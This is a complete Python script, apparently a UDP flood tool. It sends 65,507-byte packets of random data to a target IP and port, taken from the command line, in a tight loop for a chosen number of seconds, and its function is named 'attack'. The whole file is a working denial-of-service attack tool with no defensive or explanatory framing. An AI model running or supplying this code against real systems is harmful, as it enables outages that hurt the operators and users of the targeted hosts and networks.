import socket
import random
import sys
from time import time as tt

ip = str(sys.argv[1])
port = int(sys.argv[2])
time = int(sys.argv[3])

def attack(ip, port, time):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(65535, port))

    startup = tt()
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEPORT, 1)
    s.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, 2)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 102038)
    s.setsockopt(socket.SOL_IP, socket.IP_MULTICAST_TTL, 20)
    s.setsockopt(socket.SOL_IP, socket.IP_MULTICAST_LOOP, 1)
    data = random._urandom(65507)
    addr = (str(ip),int(port))
    while True:

        endtime = tt()
        if (startup + time) < endtime:
            break
            
        s.sendto(data, addr)

if __name__ == '__main__':
    try:
        attack(ip, port, time)
    except KeyboardInterrupt:
        print("\033[32mAttack stopped.")